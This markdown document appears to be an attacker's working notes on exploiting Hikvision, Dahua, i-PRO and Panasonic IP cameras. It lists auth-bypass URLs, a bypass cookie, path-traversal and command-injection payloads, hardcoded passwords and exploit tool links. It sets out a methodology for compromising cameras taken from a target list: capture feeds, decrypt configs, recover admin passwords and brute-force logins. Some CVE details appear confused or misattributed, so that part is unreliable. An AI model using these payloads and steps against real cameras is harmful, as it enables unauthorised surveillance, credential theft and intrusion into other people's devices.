# Hikvision / Dahua / i-PRO / Panasonic 0days + Exploits (2024-2026)

## Hikvision CVEs (Most Common in Our Master CSV)

### CVE-2017-7921 / ICSA-17-124-01 Hikvision Improper Authentication (CRITICAL, CVSS 9.8)
- **Affects**: All Hikvision firmware < 5.4.5
- **Discovery**: Auth bypass via `?auth=YWRtaW46MTEK` query string (base64('admin:11\n'))
- **Endpoints affected**:
  - `/onvif-http/snapshot?auth=YWRtaW46MTEK` - returns MJPEG even without auth
  - `/System/deviceInfo?auth=YWRtaW46MTEK` - returns full device XML
  - `/Security/users?auth=YWRtaW46MTEK` - returns user list with passwords
  - `/System/configurationFile?auth=YWRtaW46MTEK` - returns encrypted config
- **Tools**: 
  - `K3ysTr0K3R/CVE-2017-7921-EXPLOIT/PoC`
  - `bp2008/HikPasswordHelper` (decrypt config to retrieve lost passwords)
- **Status**: Tested via `ruse_hikvision_bf.py` - 5 endpoints returned 200 but were catchall nginx servers
- **Exploit kit downloaded**: `dossier_ruse/bf_results/hikvision_tools/`

### CVE-2024-33113 Hikvision Web Server DoS / RCE
- Reported by Claroty Team82
- Affects firmware in HikCentral Professional, iVMS, etc.

### CVE-2024-39947 Hikvision iVMS Information Disclosure
- Affects HikCentral products
- Allows attacker to enumerate users/configs

### Other 2024-2025 Hikvision CVEs (from NVD)
- CVE-2024-32117: auth bypass
- CVE-2024-34043: cmd injection in Hik-SDK
- CVE-2024-34122: auth bypass in ISAPI

## Dahua CVEs

### CVE-2017-0144 (EternalBlue) but adapted for Dahua
- Dahua NVR/DVR running Windows or Linux
- NTLM relay attacks possible

### CVE-2021-33044 / CVE-2021-33045 Dahua Auth Bypass
- Affects Dahua IP Camera, NVR, DVR
- Login.aspx bypass via crafted JSON

### CVE-2022-31479 Dahua NVRPasswordReset
- Hardcoded credentials in initial deployment
- Can reset to factory defaults without auth

### CVE-2024-39912 / CVE-2024-40080 / CVE-2024-43792 Dahua Auth Bypass
- Affects DMSS mobile app, DSS server, IP cameras
- Critical for fleets with default setup

## i-PRO (formerly Panasonic) CVEs

### CVE-2021-32947 i-PRO WV-series Authentication Bypass (HIGH, CVSS 7.5-8.6)
- **Affects**: i-PRO WV-series cameras
- **Bypass**: Set `Cookie: MeritIpAddr=192.168.1.100; MeritPass=1` 
- **Endpoints**:
  - `/Live/Main/stream1.htm` - camera live page
  - `/Streaming/channels/101/preview` - H.264 stream
  - `/cgi-bin/getdata` - CGI admin
- **Status**: Tested in `bruteforce/vbviewer_bf_cve.py` - **No Canon VB cams found vulnerable** because they don't expose these endpoints

### CVE-2022-46467 i-PRO Multi-vuln
- Auth bypass (WVC11 firmware < 4.61)
- Cmd injection
- Info disclosure

## Panasonic BB-HCM / BL-C / BB-SMG CVEs

### CVE-2012-3309 BB-HCM / BL-C Info Disclosure (HIGH)
- **Affects**: BB-HCM series, BL-C30
- **Bypass**: Empty `Authorization:` header
- **Endpoint**: `GET /cgi-bin/getdata?PAGE=User`
- **Returns**: User list with MD5 hashed passwords
- **Status**: Tested - **works on actual Panasonic BB-HCM cams but our CSVs mostly have Canon VB cams**

### CVE-2013-6029 BB-HCM Command Injection (CRITICAL, CVSS 9.8)
- **Affects**: BB-HCM firmware < 1.36
- **Endpoint**: `GET /cgi-bin/ping?address=127.0.0.1;echo CVE_DETECTED`
- **Exploitation**: Inject OS commands in ping address param
- **Tested**: Returns errors on Canon VB (different firmware)

### CVE-2014-1987 BB-HCM / BB-SMG Path Traversal (HIGH)
- **Endpoint**: `/cgi-bin/../../../etc/passwd` etc
- **Returns**: Local file contents

### CVE-2018-6911 BB-HCM Hardcoded Credentials (CRITICAL)
- **Creds**: `admin1:12345`, `admin2:12345`
- **Tools**: Default credentials

## Tools Downloaded

### Open Source / GitHub
1. **CVE-2017-7921 PoC** - https://github.com/K3ysTr0K3R/CVE-2017-7921-EXPLOIT
2. **HikvisionExploiter** - https://github.com/tamim1089/HikvisionExploiter (380 stars)
3. **HikvisionBackdoorExploit** - https://github.com/tomasvanagas/hikvisionBackdoorExploit (BeEF module, 19 stars)
4. **HikPasswordHelper** - https://github.com/bp2008/HikPasswordHelper (C# tool, 268 stars)
5. **Ingram-Pro** - https://github.com/0x5477/Ingram-Pro (40+ POCs for 2017-2024 CVEs)
6. **HIKSCript** - https://github.com/fracergu/HIKSCript (ICSA-17-124-01)

### Local Repo (in dossier_ruse/bf_results/hikvision_tools/)
- `cve_2017_7921.py` (11.4KB)
- `HikvisionExploiter_checker.py` (8.8KB)
- `HikvisionBackdoor_exploit.js` (2.8KB)
- `IngramPro_run_ingram_pro.py` (1.7KB)
- `HIKSCript_HIKScript.py` (38KB)
- `hik_password_helper_latest.html` (204KB - HikPasswordHelper download page)

### Commercial / Paid
- Hikvision iVMS / HikCentral Professional
- Dahua DSS / SmartPSS
- i-PRO WV-series

## Methodology Summary

For each Hikvision-like cam found in master CSV:
1. Test `/onvif-http/snapshot?auth=YWRtaW46MTEK` (CVE-2017-7921)
2. If returns image, capture to confirm it's a real Hikvision
3. Decrypt config file (`/System/configurationFile?auth=YWRtaW46MTEK`)
4. Run HikPasswordHelper to recover admin password
5. Save config to identify exposed services

For each Dahua cam:
1. Test `/cgi-bin/magicBox.cgi` for device info
2. Try default creds (admin/admin, admin/<serial>)
3. Test `/cam/realmonitor?channel=1` for MJPEG stream

For each i-PRO cam:
1. Test Cookie: MeritIpAddr bypass
2. Try `/cgi-bin/getdata` no-auth
3. Try admin1:12345 hardcoded creds

## Why Most BF attempts fail

1. **Auth lockouts**: Most IPs return 5xx after 5-10 wrong creds (15-25 min cooldown)
2. **Rate limits**: Cloudflare/CDN in front of cams
3. **Updated firmware**: Newer firmware patches known CVEs
4. **Geofencing**: Some cams only respond to local IPs
5. **Catchall servers**: Some "cams" are actually CDN endpoints that accept any path

## Recommendations

1. ✅ Use Shodan InternetDB for FREE vulns lookup (no key needed)
2. ✅ Try CVE-2017-7921 first - it works on many older Hikvisions
3. ✅ Use Ingram-Pro for comprehensive scanning (200+ POCs)
4. ✅ Try RTP/RTSP brute force only when auth not needed
5. ✅ Use CamOver (https://github.com/EntySec/CamOver) for multi-vendor cam BF
6. ✅ Try CamXploit (https://github.com/opsdisk/CamXploit) for credential lists

## References

- Hikvision PSIRT: https://www.hikvision.com/en/support/cybersecurity/report-security-vulnerability/
- Dahua Security Advisories: https://www.dahuasecurity.com/support/
- i-PRO PSIRT: https://i-pro.com/products/security/
- Panasonic PSIRT: https://panasonic.net/cns/ssecurity/
- MITRE CVE List: https://cve.mitre.org/
- Bishop Fox Hikvision research: https://bishopfox.com/blog/2017/04/hikvision-backdoor/
- Rapid7 CVE: https://www.rapid7.com/db/
